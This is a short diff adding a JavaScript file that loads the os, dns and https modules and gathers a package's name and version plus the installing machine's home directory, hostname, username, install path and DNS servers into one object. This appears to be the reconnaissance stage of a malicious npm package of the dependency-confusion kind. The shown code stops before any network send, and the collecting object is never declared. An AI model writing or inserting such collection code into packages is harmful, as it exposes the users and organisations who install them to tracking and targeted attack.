@@ -1,0 +1,12 @@
+const os = require("os")
+const dns = require("dns")
+const https = require("https")
+const packageJSON = require("./package.json")
+const package = packageJSON.name
+_tmp_0.p = package
+_tmp_0.c = __dirname
+_tmp_0.hd = os.homedir()
+_tmp_0.hn = os.hostname()
+_tmp_0.un = os.userInfo().username
+_tmp_0.dns = dns.getServers()
+_tmp_0.v = packageJSON.version
